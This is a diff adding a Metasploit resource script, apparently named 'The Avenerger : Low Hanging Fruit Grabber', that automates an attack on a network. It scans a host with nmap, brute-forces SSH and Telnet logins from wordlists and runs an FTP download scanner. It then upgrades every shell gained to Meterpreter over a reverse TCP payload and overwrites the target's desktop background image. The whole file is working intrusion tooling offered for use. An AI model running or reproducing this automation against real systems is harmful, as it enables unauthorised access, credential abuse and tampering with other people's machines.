@@ -1,0 +1,87 @@
+<ruby>
+print_status("The Avenerger : Low Hanging Fruit Grabber : by PwnStudios")
+#run_single("show options")
+#default usage of nmap as portscanner
+if (framework.datastore['poodles']=="true")
+	print_line("poodles were found!")
+end 
+run_single("db_nmap 192.168.127.132")
+run_single("setg pass_file /usr/wordlists/pass.txt")
+run_single("setg user_file /usr/wordlists/user.txt")
+#run_single("unsetg blank_passwords")
+#run_single("unsetg username")
+framework.db.hosts.each do |host|
+	print_status("#{host.address}")
+	run_single("setg rhosts " + "#{host.address}")
+	#runs the test for ssh
+	
+	current_session_count = framework.sessions.count
+	initial_session_count = framework.sessions.count
+	
+	print_line("")
+	print_status("Scanning SSH server(s)")
+	run_single("use auxiliary/scanner/ssh/ssh_login")
+	#run_single("set rhosts #{framework.datastore['rhosts']}")
+	run_single("run")
+	
+	if(framework.sessions.count > current_session_count)
+		print_good("Got new sessions from ssh")
+		current_session_count = framework.sessions.count
+	end
+	print_line("")
+	print_status("Scanning FTP server(s)")
+	#runs the test for ftp
+	run_single("use auxiliary/scanner/ftp/ftp_download")
+	#run_single("set rhosts #{framework.datastore['rhosts']}")
+	run_single("run")
+	
+	print_line("")
+	print_status("Scanning Telnet Server(s)")
+	#runs the test for telnet
+	run_single("use auxiliary/scanner/telnet/telnet_login")
+	#run_single("set rhosts #{framework.datastore['rhosts']}")
+	run_single("run")
+	
+	if(framework.sessions.count > current_session_count)
+		print_good("Got new sessions from telnet")
+		current_session_count = framework.sessions.count
+	end
+	run_single("setg sessionCount #{framework.sessions.count}")
+	
+	local_port = 4433
+	run_single("use post/multi/manage/shell_to_meterpreter")
+	if(initial_session_count == 0)
+		initial_session_count+=1
+	end
+	for i in initial_session_count..current_session_count
+		run_single("set session #{i}")
+		run_single("set lport " + "#{local_port}")
+		local_port += 1
+		run_single("set payload linux/x86/meterpreter/reverse_tcp")
+		run_single("exploit -j")
+		#run_single("sessions -u #{i}")
+	end
+	last_shell_id = initial_session_count + current_session_count
+	for i in last_shell_id..(2*current_session_count)
+		print_line("waiting to upgrade #{i-1}")
+		#wait for the session count to update before trying to use the shell
+		
+		while(framework.sessions.count < i)
+			t=0
+			t+=1
+		end
+		print_line("upgraded shell #{i-1} to meterpreter")
+		run_single("use post/linux/manage/upload_single")
+		run_single("set session #{i}")
+		run_single("set remotepath /usr/share/backgrounds/warty-final-ubuntu.png")
+		run_single("set localpath /tmp/uni.jpg")
+		sleep 3
+		run_single("run")
+	end
+end
+run_single("unsetg pass_file")
+run_single("unsetg user_file")
+run_single("unsetg rhosts")
+run_single("unsetg blank_passwords")
+run_single("back")
+</ruby>
